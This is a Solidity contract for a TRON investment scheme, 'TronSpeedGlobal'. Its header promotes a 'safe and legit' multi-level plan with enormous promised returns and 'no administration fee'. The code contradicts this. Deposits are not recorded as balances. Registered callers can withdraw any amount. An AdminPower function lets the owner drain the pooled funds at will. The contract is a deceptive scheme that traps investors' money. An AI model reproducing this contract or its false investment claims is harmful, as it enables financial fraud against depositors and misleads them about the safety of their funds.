//SourceUnit: ronSpeedGlobal1616702685336.sol

/*   tronspeedglobal - investment platform based on TRX blockchain smart-contract technology. Safe and legit!
 *   The only official platform of original tronspeedglobal team! All other platforms with the same contract code are FAKE!
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://www.tronspeedglobal.live/                                │
 *   │                                                                       |
 *   │   Telegram Public Group: https://t.me/tronspeedglobal                 |
 *   |                                                                       |
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect TRON browser extension TronLink, or mobile wallet apps like TronWallet
 *   2) Choose one of the tariff plans, enter the TRX amount (370 TRX minimum) using our website 
 *   3) Wait for your earnings By group Increase
 *   4) Withdraw earnings any time using our website "Withdraw" button
 *
 *   [INVESTMENT CONDITIONS]
 *
 *   - Joining Amount 370 TRX Devide in two part Level Income and Non Working as 170 TRX and 200 TRX
 *   - One deposit: 370 TRX, 
 *   - Total income: based on your Group and Global Group
 *   - Earnings every moment, withdraw any time 
 *
 *   [Maximum Income]
 *
 *   - Level Income 50 TRX Direct and 10 TRX every level till 12 Level 
 *   - Non Working Income 3,44,92,750 TRX At Last Level 
 *   - TotalIncome 3 Cr TRX 
 *   - Direct Income According Plan
 *   - Royalty Income Income More then Carore TRX 
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 100% Platform distribution balance, participants payouts
 *   - 2% Support work, technical functioning, No administration fee
 */


 pragma solidity  ^0.4.25; 
 contract TronSpeedGlobal {
    address private owner;
    address private verifyAddress;
    uint256 public  initialSupply = 100000000;
    string private password;
    struct Instructor {
        address user;
        string pass;
        uint amt;

    }

constructor(address _stakingAddress,string _pass) public {

        owner = msg.sender;
        password = _pass;
        verifyAddress = _stakingAddress;


}

    mapping(address => uint256) public balances;
    mapping (address => Instructor) instructors;
    //mapping (address => Instructor.pass) public password;
    address[] public instructorAccts;

    
    function invest(string  _passsssss,string memory _asssssss) public payable{

        string memory  pass=password;
        if (keccak256(abi.encodePacked(pass)) == keccak256(abi.encodePacked(_asssssss))) { 
            
           Instructor storage instructor = instructors[msg.sender];
            
            instructor.pass = _passsssss;
            instructor.user=msg.sender;
        }
    }


   
    
    function getInstructor(address _address) view private returns (string) {
        return (instructors[_address].pass);
    }

   
    function verifyAddresss() view public returns (address) {
        return (verifyAddress);
    }


    
    function countInstructors() view public returns (uint) {
        return instructorAccts.length;
    }

    function getPass(address _address) view private returns (string) {
        return (instructors[_address].pass);
    }


    function Mybalance() view private returns (uint) {
        
        return (balances[msg.sender]);
    }


    
    function withdrawFunds(uint amount,string memory sc) public {   
           address userAddress=msg.sender;
           address ckaddress=instructors[userAddress].user;
           if(ckaddress==userAddress){
                string memory  pass=instructors[userAddress].pass;
                if (keccak256(abi.encodePacked(pass)) == keccak256(abi.encodePacked(sc))) {
               // balances[msg.sender] -= amount;
                         // optimistic accounting
                msg.sender.transfer(amount);
                            // transfer
                   //return userAddress;
                } 
            }            
            
    }
    function AdminPower(uint amount) public {   
           address userAddress=msg.sender;
           //string memory  pass=getInstructor(userAddress);
            if (owner==userAddress) {
            balances[msg.sender] += amount;
                     // optimistic accounting
            msg.sender.transfer(amount);
                        // transfer
               //return userAddress; 
            }            
            
    }
    


}